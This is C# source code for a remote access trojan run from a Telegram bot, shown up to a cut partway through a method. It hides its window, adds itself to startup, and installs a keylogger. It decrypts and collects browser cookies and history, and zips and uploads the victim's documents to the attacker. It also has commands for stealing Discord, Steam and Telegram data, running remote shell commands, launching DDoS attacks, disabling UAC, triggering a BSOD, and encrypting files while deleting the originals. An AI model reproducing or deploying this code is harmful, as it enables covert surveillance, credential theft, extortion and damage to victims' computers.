using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;
using System.Management.Automation;
using Accord.Video;
using Accord.Video.DirectShow;
using Accord.Video.FFMPEG;
using System.Collections.Generic;
using System.Drawing;
using System.Security.Cryptography;
using System.Text;
using System.Net.NetworkInformation;
using System.Management;
using System.Net;
using System.Drawing.Imaging;
using NAudio.Wave;
using System.Data.SQLite;
using System.Net.Mail;
using System.DirectoryServices;
using System.Text.RegularExpressions;
using System.Net.Http;
using Newtonsoft.Json;
using Accord.Controls;
using System.Xml.Linq;
using WMPLib;
using LibVLCSharp.Shared;
using System.Collections.Concurrent;

class Program
{
    static ITelegramBotClient botClient;
    static string botToken = "{{TOKEN}}";
static long adminChatId = {{ADMIN_ID}};
    static string currentPcId = Environment.MachineName + "_" + Environment.UserName;
    static string selectedPcId = null;
    static bool isTargetPc = false;
    private const string RECORD_AUDIO_COMMAND = "recordaudio";
    static CancellationTokenSource ddosCts;
    static string currentDdosTarget;
    static string encryptionPassword = "DefaultStrongPassword123!"; // Can be made configurable

    static string currentMenu = "main";
    static string currentCommand = "";

    static Dictionary<string, DateTime> connectedPcs = new Dictionary<string, DateTime>();

    [Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }

    [Flags]
    public enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    }

    [Flags]
    public enum MemoryProtection
    {
        Execute = 0x10,
        ExecuteRead = 0x20,
        ExecuteReadWrite = 0x40,
        ExecuteWriteCopy = 0x80,
        NoAccess = 0x01,
        ReadOnly = 0x02,
        ReadWrite = 0x04,
        WriteCopy = 0x08,
        GuardModifierflag = 0x100,
        NoCacheModifierflag = 0x200,
        WriteCombineModifierflag = 0x400
    }

    [Flags]
    public enum FreeType
    {
        Decommit = 0x4000,
        Release = 0x8000,
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out int lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, FreeType dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);

    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int X, int Y);

    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    // Добавляем константы для внедрения
    private const uint PROCESS_CREATE_THREAD = 0x0002;
    private const uint PROCESS_QUERY_INFORMATION = 0x0400;
    private const uint PROCESS_VM_OPERATION = 0x0008;
    private const uint PROCESS_VM_WRITE = 0x0020;
    private const uint PROCESS_VM_READ = 0x0010;
    private const uint MEM_COMMIT = 0x00001000;
    private const uint MEM_RESERVE = 0x00002000;
    private const uint PAGE_READWRITE = 0x04;

    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

    [DllImport("user32.dll")]
    private static extern bool BlockInput(bool fBlockIt);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    public static extern int MessageBox(int hWnd, string text, string caption, uint type);

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, KeyboardProc callback, IntPtr hInstance, uint threadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hInstance);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

    private const byte VK_LWIN = 0x5B;
    private const byte VK_D = 0x44;
    private const byte VK_MENU = 0x12; // Alt key
    private const byte VK_F4 = 0x73;
    private const uint KEYEVENTF_KEYDOWN = 0x0000;
    private const uint KEYEVENTF_KEYUP = 0x0002;

    [DllImport("kernel32.dll")]
    private static extern IntPtr LoadLibrary(string lpFileName);

    private delegate IntPtr KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr _hookID = IntPtr.Zero;
    private static StringBuilder _keyLog = new StringBuilder();
    private static string _logFilePath = Path.Combine(Path.GetTempPath(), "keylog.txt");
    private static object duration;

    static async Task Main()
    {
        IntPtr hConsole = GetConsoleWindow();
        ShowWindow(hConsole, 0);

        botClient = new TelegramBotClient(botToken);

        var receiverOptions = new ReceiverOptions
        {
            AllowedUpdates = new[] { UpdateType.Message, UpdateType.CallbackQuery }
        };

        botClient.StartReceiving(
            updateHandler: HandleUpdateAsync,
            pollingErrorHandler: HandlePollingErrorAsync,
            receiverOptions: receiverOptions
        );

        connectedPcs[currentPcId] = DateTime.Now;
        await SendSafeTextMessage(adminChatId, $"🖥️ Backdoor activated on {currentPcId}");
        await ShowMainMenu(adminChatId);

        AddToStartup();
        MakePersistent();
        InstallKeylogger();

        while (true)
        {
            var inactivePcs = connectedPcs.Where(p => (DateTime.Now - p.Value).TotalMinutes > 5).ToList();
            foreach (var pc in inactivePcs)
            {
                connectedPcs.Remove(pc.Key);
            }

            if (connectedPcs.ContainsKey(currentPcId))
            {
                connectedPcs[currentPcId] = DateTime.Now;
            }

            await Task.Delay(60000);
        }
    }

    private static void InstallKeylogger()
    {
        _hookID = SetHook(HookCallback);
    }

    private static IntPtr SetHook(KeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(13, proc, LoadLibrary(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)0x0100)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            _keyLog.Append((Keys)vkCode + " ");

            if (_keyLog.Length > 100)
            {
                System.IO.File.AppendAllText(_logFilePath, _keyLog.ToString());
                _keyLog.Clear();
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static string EscapeMarkdown(string text)
    {
        if (string.IsNullOrEmpty(text)) return text;

        var builder = new StringBuilder(text);
        builder.Replace("_", "\\_");
        builder.Replace("*", "\\*");
        builder.Replace("[", "\\[");
        builder.Replace("]", "\\]");
        builder.Replace("(", "\\(");
        builder.Replace(")", "\\)");
        builder.Replace("~", "\\~");
        builder.Replace("`", "\\`");
        builder.Replace(">", "\\>");
        builder.Replace("#", "\\#");
        builder.Replace("+", "\\+");
        builder.Replace("-", "\\-");
        builder.Replace("=", "\\=");
        builder.Replace("|", "\\|");
        builder.Replace("{", "\\{");
        builder.Replace("}", "\\}");
        builder.Replace(".", "\\.");
        builder.Replace("!", "\\!");

        return builder.ToString();
    }

    private static string MinimizeAllWindows()
    {
        try
        {
            // Имитация нажатия Win + D
            keybd_event(0x5B, 0, 0, UIntPtr.Zero); // Win
            keybd_event(0x44, 0, 0, UIntPtr.Zero); // D
            keybd_event(0x44, 0, 0x0002, UIntPtr.Zero); // Отпускаем D
            keybd_event(0x5B, 0, 0x0002, UIntPtr.Zero); // Отпускаем Win
            return "✅ All windows minimized";
        }
        catch (Exception ex)
        {
            return $"❌ Error: {ex.Message}";
        }
    }

    private static string EncryptFiles(string path, string password)
    {
        try
        {
            int filesEncrypted = 0;
            if (System.IO.File.Exists(path))
            {
                EncryptFile(path, password);
                filesEncrypted = 1;
            }
            else if (Directory.Exists(path))
            {
                foreach (string file in Directory.GetFiles(path, "*.*", SearchOption.AllDirectories))
                {
                    try
                    {
                        EncryptFile(file, password);
                        filesEncrypted++;
                    }
                    catch { }
                }
            }
            else
            {
                return "❌ Path not found";
            }

            return $"✅ Encrypted {filesEncrypted} files with AES-256";
        }
        catch (Exception ex)
        {
            return $"❌ Encryption error: {ex.Message}";
        }
    }

    private static string DecryptFiles(string path, string password)
    {
        try
        {
            int filesDecrypted = 0;
            if (System.IO.File.Exists(path) && path.EndsWith(".enc"))
            {
                DecryptFile(path, password);
                filesDecrypted = 1;
            }
            else if (Directory.Exists(path))
            {
                foreach (string file in Directory.GetFiles(path, "*.enc", SearchOption.AllDirectories))
                {
                    try
                    {
                        DecryptFile(file, password);
                        filesDecrypted++;
                    }
                    catch { }
                }
            }
            else
            {
                return "❌ Path not found or not encrypted (.enc)";
            }

            return $"✅ Decrypted {filesDecrypted} files";
        }
        catch (Exception ex)
        {
            return $"❌ Decryption error: {ex.Message}";
        }
    }

    private static void EncryptFile(string filePath, string password)
    {
        byte[] salt = GenerateRandomSalt();

        using (var aes = Aes.Create())
        {
            var key = new Rfc2898DeriveBytes(password, salt, 10000);
            aes.Key = key.GetBytes(aes.KeySize / 8);
            aes.IV = key.GetBytes(aes.BlockSize / 8);

            using (var inputFile = new FileStream(filePath, FileMode.Open))
            using (var outputFile = new FileStream(filePath + ".enc", FileMode.Create))
            {
                outputFile.Write(salt, 0, salt.Length);

                using (var cryptoStream = new CryptoStream(
                    outputFile,
                    aes.CreateEncryptor(),
                    CryptoStreamMode.Write))
                {
                    inputFile.CopyTo(cryptoStream);
                }
            }
        }

        System.IO.File.Delete(filePath);
    }

    private static void PlayVideoFullscreenSilent(string videoPath)
    {
        try
        {
            // Создаем скрытый процесс
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c start \"\" \"{videoPath}\" /fullscreen",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                }
            };
            process.Start();

            // Альтернативный вариант через rundll32 (может работать тише)
            /*
            Process.Start(new ProcessStartInfo
            {
                FileName = "rundll32.exe",
                Arguments = $"url.dll,FileProtocolHandler \"{videoPath}\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
            */
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Ошибка воспроизведения: {ex.Message}");
        }
    }

    private static void DecryptFile(string filePath, string password)
    {
        byte[] salt = new byte[32];

        using (var inputFile = new FileStream(filePath, FileMode.Open))
        {
            inputFile.Read(salt, 0, salt.Length);

            using (var aes = Aes.Create())
            {
                var key = new Rfc2898DeriveBytes(password, salt, 10000);
                aes.Key = key.GetBytes(aes.KeySize / 8);
                aes.IV = key.GetBytes(aes.BlockSize / 8);

                using (var cryptoStream = new CryptoStream(
                    inputFile,
                    aes.CreateDecryptor(),
                    CryptoStreamMode.Read))
                {
                    string outputPath = filePath.Substring(0, filePath.Length - 4);
                    using (var outputFile = new FileStream(outputPath, FileMode.Create))
                    {
                        cryptoStream.CopyTo(outputFile);
                    }
                }
            }
        }

        System.IO.File.Delete(filePath);
    }

    private static byte[] GenerateRandomSalt()
    {
        byte[] salt = new byte[32];
        using (var rng = RandomNumberGenerator.Create())
        {
            rng.GetBytes(salt);
        }
        return salt;
    }

    private static string CloseActiveWindow()
    {
        try
        {
            // Имитация нажатия Alt + F4
            keybd_event(0x12, 0, 0, UIntPtr.Zero); // Alt
            keybd_event(0x73, 0, 0, UIntPtr.Zero); // F4
            keybd_event(0x73, 0, 0x0002, UIntPtr.Zero); // Отпускаем F4
            keybd_event(0x12, 0, 0x0002, UIntPtr.Zero); // Отпускаем Alt
            return "✅ Active window closed";
        }
        catch (Exception ex)
        {
            return $"❌ Error: {ex.Message}";
        }
    }

    private static async Task SendSafeTextMessage(long chatId, string text, bool isCodeBlock = false)
    {
        try
        {
            string formattedText = isCodeBlock ? $"```\n{EscapeMarkdown(text)}\n```" : EscapeMarkdown(text);
            await botClient.SendTextMessageAsync(
                chatId: chatId,
                text: formattedText,
                parseMode: isCodeBlock ? ParseMode.MarkdownV2 : ParseMode.Html
            );
        }
        catch (Exception ex)
        {
            try
            {
                await botClient.SendTextMessageAsync(
                    chatId: chatId,
                    text: "⚠️ Message contains invalid characters. Here's plain text:\n\n" +
                          text.Replace("*", "").Replace("_", "").Replace("`", ""),
                    parseMode: ParseMode.Html
                );
            }
            catch
            {
                await botClient.SendTextMessageAsync(
                    chatId: chatId,
                    text: "⚠️ Could not send message due to invalid characters",
                    parseMode: ParseMode.Html
                );
            }
        }
    }

    private static async Task SendTextAsFile(long chatId, string text, string filename)
    {
        try
        {
            string tempFile = Path.Combine(Path.GetTempPath(), filename);
            System.IO.File.WriteAllText(tempFile, text);

            using (FileStream stream = System.IO.File.OpenRead(tempFile))
            {
                await botClient.SendDocumentAsync(
                    chatId: chatId,
                    document: new InputOnlineFile(stream, filename)
                );
            }
            System.IO.File.Delete(tempFile);
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(chatId, $"❌ Error sending file: {ex.Message}");
        }
    }

    private static async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
    {
        if (update.Type == UpdateType.Message && update.Message != null)
        {
            await HandleTelegramMessageAsync(botClient, update.Message);
        }
        else if (update.Type == UpdateType.CallbackQuery && update.CallbackQuery != null)
        {
            await HandleCallbackQueryAsync(botClient, update.CallbackQuery);
        }
    }

    private static async Task HandleTelegramMessageAsync(ITelegramBotClient botClient, Telegram.Bot.Types.Message message)
    {
        if (message.Chat.Id != adminChatId)
            return;

        if (message.Document != null)
        {
            // Обработка документов для смены обоев
            if (currentCommand == "changewallpaper")
            {
                string result = await SetWallpaperFromDocuments(message.Document);
                await SendSafeTextMessage(message.Chat.Id, result);
                currentCommand = "";
                return;
            }

            if (currentCommand == "screammake")
            {
                string result = await HandleScreamVideo(message.Document);
                await SendSafeTextMessage(message.Chat.Id, result);
                currentCommand = "";
                return;
            }

            // Обработка видео для полноэкранного воспроизведения
            else if (currentCommand == "fullscreenvideo")
            {
                string result = await HandleScareVideo(message.Chat.Id, message.Document, duration);
                await SendSafeTextMessage(message.Chat.Id, result);
                currentCommand = "";
                return;
            }

            // Обычная загрузка файлов
            string uploadResult = await HandleFileUpload(message.Document);
            await SendSafeTextMessage(message.Chat.Id, $"📤 Upload ({currentPcId}):\n{uploadResult}");
            return;
        }

        string cmd = message.Text;
        string[] args = cmd?.Split(' ');

        if (cmd == "/start" || cmd == "/menu")
        {
            await ShowMainMenu(message.Chat.Id);
            return;
        }

        if (cmd == "/list")
        {
            await ShowPcListMenu(message.Chat.Id);
            return;
        }

        if (!string.IsNullOrEmpty(currentCommand))
        {
            await ExecuteCommandWithInput(message.Chat.Id, currentCommand, cmd);
            currentCommand = "";
            return;
        }

        if (args != null && args.Length > 0)
        {
            string cmdLower = args[0].ToLower();

            if (cmdLower == "/screen")
            {
                await HandleScreenshotCommand(botClient, message.Chat.Id);
            }
            else if (cmdLower == "/cmd" && args.Length > 1)
            {
                string command = string.Join(" ", args.Skip(1));
                string result = ExecuteCommand("cmd.exe", $"/c {command}");
                await SendSafeTextMessage(message.Chat.Id, $"📟 CMD ({currentPcId}):\n{result}", true);
            }
            else if (cmdLower == "/ps" && args.Length > 1)
            {
                string script = string.Join(" ", args.Skip(1));
                string result = ExecutePowerShell(script);
                await SendSafeTextMessage(message.Chat.Id, $"⚡ PowerShell ({currentPcId}):\n{result}", true);
            }
            else if (cmdLower == "/startddos")
            {
                if (args.Length > 1)
                {
                    await StartDDoS(message.Chat.Id, string.Join(" ", args.Skip(1)));
                }
                else
                {
                    currentCommand = "startddos";
                    await SendSafeTextMessage(message.Chat.Id, "enter url:");
                }
            }
            else if (cmdLower == "/stopddos")
            {
                await StopDDoS(message.Chat.Id);
            }
            else if (cmdLower == "/stealtelegram")
            {
                string result = await StealTelegramSessions();
                await SendTextAsFile(message.Chat.Id, result, "telegram_sessions.zip");
            }
            else if (cmdLower == "/exe" && args.Length > 1)
            {
                string exePath = args[1];
                string parameters = args.Length > 2 ? string.Join(" ", args.Skip(2)) : "";
                bool runAsAdmin = parameters.ToLower().Contains("admin");
                string result = RunExe(exePath, parameters.Replace("admin", "").Trim(), runAsAdmin);
                await SendSafeTextMessage(message.Chat.Id, $"🛠️ EXE ({currentPcId}):\n{result}", true);
            }
            else if (cmdLower == "/disableuac")
            {
                string result = DisableUAC();
                await SendSafeTextMessage(message.Chat.Id, $"🔓 UAC ({currentPcId}):\n{result}");
            }
            else if (cmdLower == "/stealdiscord")
            {
                string result = await StealDiscordTokens();
                await SendTextAsFile(message.Chat.Id, result, "discord_tokens.txt");
            }
            else if (cmdLower == "/download" && args.Length > 1)
            {
                string url = string.Join(" ", args.Skip(1));
                string result = DownloadFile(url);
                await SendSafeTextMessage(message.Chat.Id, $"📥 Download ({currentPcId}):\n{result}");
            }
            else if (cmdLower == "/minimizeall")
            {
                string result = MinimizeAllWindows();
                await SendSafeTextMessage(message.Chat.Id, result);
            }
            else if (cmdLower == "/closewindow")
            {
                string result = CloseActiveWindow();
                await SendSafeTextMessage(message.Chat.Id, result);
            }
            else if (cmdLower == "/webcam" && args.Length > 1 && int.TryParse(args[1], out int seconds))
            {
                await HandleWebcamCommand(botClient, message.Chat.Id, seconds);
            }
            else if (cmdLower == "/record" && args.Length > 1 && int.TryParse(args[1], out int recordSeconds))
            {
                await HandleScreenRecordCommand(botClient, message.Chat.Id, recordSeconds);
            }
            else if (cmdLower == "/sysinfo")
            {
                string sysInfo = GetSystemInfo();
                await SendSafeTextMessage(message.Chat.Id, $"🖥️ System Info ({currentPcId}):\n{sysInfo}", true);
            }
            else if (cmdLower == "/stealpasswords")
            {
                string passwords = StealPasswords();
                await SendSafeTextMessage(message.Chat.Id, $"🔑 Saved Passwords ({currentPcId}):\n{passwords}", true);
            }
            else if (cmdLower == "/stealcookies")
            {
                string cookies = StealBrowserCookies();
                await SendTextAsFile(message.Chat.Id, cookies, "cookies.txt");
            }
            else if (cmdLower == "/stealhistory")
            {
                string history = StealBrowserHistory();
                await SendTextAsFile(message.Chat.Id, history, "history.txt");
            }
            else if (cmdLower == "/stealdocuments")
            {
                await StealDocuments();
            }
            else if (cmdLower == "/keylog")
            {
                string action = args.Length > 1 ? args[1] : "status";
                string result = HandleKeylogger(action);
                await SendSafeTextMessage(message.Chat.Id, $"⌨️ Keylogger: {result} ({currentPcId})");
            }
            else if (cmdLower == "/bsod")
            {
                string result = TriggerBSOD();
                await SendSafeTextMessage(message.Chat.Id, $"💀 BSOD ({currentPcId}):\n{result}");
            }
            else if (cmdLower == "/stealsteam")
            {
                string result = await StealSteamData();
                await SendTextAsFile(message.Chat.Id, result, "steam_data.txt");
            }
            else if (cmdLower == "/mouse" && args.Length > 2)
            {
                if (int.TryParse(args[1], out int x) && int.TryParse(args[2], out int y))
                {
                    MoveMouse(x, y);
                    await SendSafeTextMessage(message.Chat.Id, $"🖱️ Mouse moved to {x},{y} ({currentPcId})");
                }
            }
            else if (cmdLower == "/click")
            {
                MouseClick();
                await SendSafeTextMessage(message.Chat.Id, $"🖱️ Mouse click performed ({currentPcId})");
            }
            else if (cmdLower == "/keyboard" && args.Length > 1)
            {
                string text = string.Join(" ", args.Skip(1));
                SendKeys.SendWait(text);
                await SendSafeTextMessage(message.Chat.Id, $"⌨️ Sent keys: {text} ({currentPcId})");
            }
            else if (cmdLower == "/scare")
            {
                await ScareUser();
                await SendSafeTextMessage(message.Chat.Id, $"👻 Scare screen activated ({currentPcId})");
            }
            else if (cmdLower == "/blockinput")
            {
                BlockInput(true);
                await SendSafeTextMessage(message.Chat.Id, $"🚫 Input blocked ({currentPcId})");
            }
            else if (cmdLower == "/screambuilder")
            {
                currentCommand = "screambuilder";
                await SendSafeTextMessage(message.Chat.Id, "Send an image or video file for the scream (with optional sound file if image), then specify duration in seconds");
            }
            else if (cmdLower == "/unblockinput")
            {
                BlockInput(false);
                await SendSafeTextMessage(message.Chat.Id, $"✅ Input unblocked ({currentPcId})");
            }
            else if (cmdLower == "/killprocess" && args.Length > 1)
            {
                string processName = args[1];
                string result = KillProcess(processName);
                await SendSafeTextMessage(message.Chat.Id, $"💀 Process {processName}: {result} ({currentPcId})");
            }
            else if (cmdLower == "/startprocess" && args.Length > 1)
            {
                string processName = args[1];
                string result = StartProcess(processName);
                await SendSafeTextMessage(message.Chat.Id, $"🚀 Process {processName}: {result} ({currentPcId})");
            }
            else if (cmdLower == "/downloadfile" && args.Length > 1)
            {
                string filePath = string.Join(" ", args.Skip(1));
                await DownloadAndSendFile(message.Chat.Id, filePath);
            }
            else if (cmdLower == "/playvideo")
            {
                currentCommand = "playvideo";
                await SendSafeTextMessage(message.Chat.Id, "send video file");
            }
            else if (cmdLower == "/persistence")
            {
                string result = AddAdvancedPersistence();
                await SendSafeTextMessage(message.Chat.Id, $"🔒 Persistence: {result} ({currentPcId})");
            }
            else if (cmdLower == "/shellexecute" && args.Length > 1)
            {
                string command = string.Join(" ", args.Skip(1));
                string result = ShellExecute(command);
                await SendSafeTextMessage(message.Chat.Id, $"💻 Shell Execute: {result} ({currentPcId})");
            }
            else if (cmdLower == "/shutdown")
            {
                string result = ShutdownPC();
                await SendSafeTextMessage(message.Chat.Id, $"🔌 Shutdown: {result} ({currentPcId})");
            }
            else if (cmdLower == "/reboot")
            {
                string result = RebootPC();
                await SendSafeTextMessage(message.Chat.Id, $"🔄 Reboot: {result} ({currentPcId})");
            }
            else if (cmdLower == "/pixellate")
            {
                await PixellateScreen();
                await SendSafeTextMessage(message.Chat.Id, $"🌀 Pixellation effect activated ({currentPcId})");
            }

            else if (cmdLower == "/messagebox")
            {
                currentCommand = "messagebox";
                await SendSafeTextMessage(message.Chat.Id, "Введите текст для Message Box:");
            }
            else if (cmdLower == "/getlocation")
            {
                string location = GetLocation();
                await SendSafeTextMessage(message.Chat.Id, $"📍 Location: {location} ({currentPcId})");
            }
            else if (cmdLower == "/listfiles" && args.Length > 1)
            {
                string path = string.Join(" ", args.Skip(1));
                string fileList = ListAllFiles(path);
                await SendTextAsFile(message.Chat.Id, fileList, "file_list.txt");
            }
            else if (cmdLower == "/networkinfo")
            {
                string netInfo = GetNetworkInfo();
                await SendSafeTextMessage(message.Chat.Id, $"🌐 Network Info ({currentPcId}):\n{netInfo}", true);
            }
            else
            {
                await SendSafeTextMessage(message.Chat.Id, "❌ Unknown command. Use /menu to show menu.");
            }
        }
    }

    private static Task<string> HandleScareVideo(long id, Document document, object duration)
    {
        throw new NotImplementedException();
    }

    private static string HandleKeylogger(string action)
    {
        try
        {
            switch (action.ToLower())
            {
                case "start":
                    if (_hookID == IntPtr.Zero)
                    {
                        _hookID = SetHook(HookCallback);
                        return "Started";
                    }
                    return "Already running";
                case "stop":
                    if (_hookID != IntPtr.Zero)
                    {
                        UnhookWindowsHookEx(_hookID);
                        _hookID = IntPtr.Zero;
                        return "Stopped";
                    }
                    return "Not running";
                case "dump":
                    if (System.IO.File.Exists(_logFilePath))
                    {
                        string log = System.IO.File.ReadAllText(_logFilePath);
                        System.IO.File.Delete(_logFilePath);
                        return log;
                    }
                    return "No logs available";
                default:
                    return _hookID == IntPtr.Zero ? "Status: Stopped" : "Status: Running";
            }
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }

    private static string StealBrowserCookies()
    {
        try
        {
            StringBuilder sb = new StringBuilder();
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string[] browsers = { "Google\\Chrome", "Microsoft\\Edge", "Opera Software\\Opera Stable" };

            foreach (string browser in browsers)
            {
                string cookiePath = Path.Combine(appData, browser, "User Data", "Default", "Cookies");
                if (System.IO.File.Exists(cookiePath))
                {
                    try
                    {
                        string tempFile = Path.GetTempFileName();
                        System.IO.File.Copy(cookiePath, tempFile, true);

                        using (var conn = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                        {
                            conn.Open();
                            using (var cmd = conn.CreateCommand())
                            {
                                cmd.CommandText = "SELECT host_key, name, encrypted_value FROM cookies";
                                using (var reader = cmd.ExecuteReader())
                                {
                                    sb.AppendLine($"=== {browser.Split('\\').Last()} Cookies ===");
                                    while (reader.Read())
                                    {
                                        string host = reader.GetString(0);
                                        string name = reader.GetString(1);
                                        byte[] encryptedValue = (byte[])reader[2];
                                        string value = Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedValue, null, DataProtectionScope.CurrentUser));
                                        sb.AppendLine($"{host} | {name}={value}");
                                    }
                                }
                            }
                        }
                        System.IO.File.Delete(tempFile);
                    }
                    catch { }
                }
            }
            return sb.ToString();
        }
        catch (Exception ex)
        {
            return $"Error stealing cookies: {ex.Message}";
        }
    }

    private static string StealBrowserHistory()
    {
        try
        {
            StringBuilder sb = new StringBuilder();
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string[] browsers = { "Google\\Chrome", "Microsoft\\Edge", "Opera Software\\Opera Stable" };

            foreach (string browser in browsers)
            {
                string historyPath = Path.Combine(appData, browser, "User Data", "Default", "History");
                if (System.IO.File.Exists(historyPath))
                {
                    try
                    {
                        string tempFile = Path.GetTempFileName();
                        System.IO.File.Copy(historyPath, tempFile, true);

                        using (var conn = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                        {
                            conn.Open();
                            using (var cmd = conn.CreateCommand())
                            {
                                cmd.CommandText = "SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 100";
                                using (var reader = cmd.ExecuteReader())
                                {
                                    sb.AppendLine($"=== {browser.Split('\\').Last()} History ===");
                                    while (reader.Read())
                                    {
                                        string url = reader.GetString(0);
                                        string title = reader.GetString(1);
                                        int visits = reader.GetInt32(2);
                                        sb.AppendLine($"{visits} visits: {title} ({url})");
                                    }
                                }
                            }
                        }
                        System.IO.File.Delete(tempFile);
                    }
                    catch { }
                }
            }
            return sb.ToString();
        }
        catch (Exception ex)
        {
            return $"Error stealing history: {ex.Message}";
        }
    }

    private static async Task StealDocuments()
    {
        try
        {
            string docsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string[] extensions = { ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".txt", ".rtf" };
            string tempDir = Path.Combine(Path.GetTempPath(), "DocsSteal");

            if (Directory.Exists(tempDir))
            {
                Directory.Delete(tempDir, true);
            }
            Directory.CreateDirectory(tempDir);

            foreach (string file in Directory.GetFiles(docsPath, "*.*", SearchOption.AllDirectories))
            {
                if (extensions.Contains(Path.GetExtension(file).ToLower()))
                {
                    try
                    {
                        string destFile = Path.Combine(tempDir, Path.GetFileName(file));
                        System.IO.File.Copy(file, destFile);
                    }
                    catch { }
                }
            }

            string zipPath = Path.Combine(Path.GetTempPath(), "documents.zip");
            if (System.IO.File.Exists(zipPath))
            {
                System.IO.File.Delete(zipPath);
            }

            System.IO.Compression.ZipFile.CreateFromDirectory(tempDir, zipPath);

            using (var stream = System.IO.File.OpenRead(zipPath))
            {
                await botClient.SendDocumentAsync(
                    chatId: adminChatId,
                    document: new InputOnlineFile(stream, "documents.zip"),
                    caption: $"📄 Documents from {currentPcId}"
                );
            }

            Directory.Delete(tempDir, true);
            System.IO.File.Delete(zipPath);
        }
        catch (Exception ex)
        {
            await SendSafeTextMessage(adminChatId, $"❌ Error stealing documents: {ex.Message}");
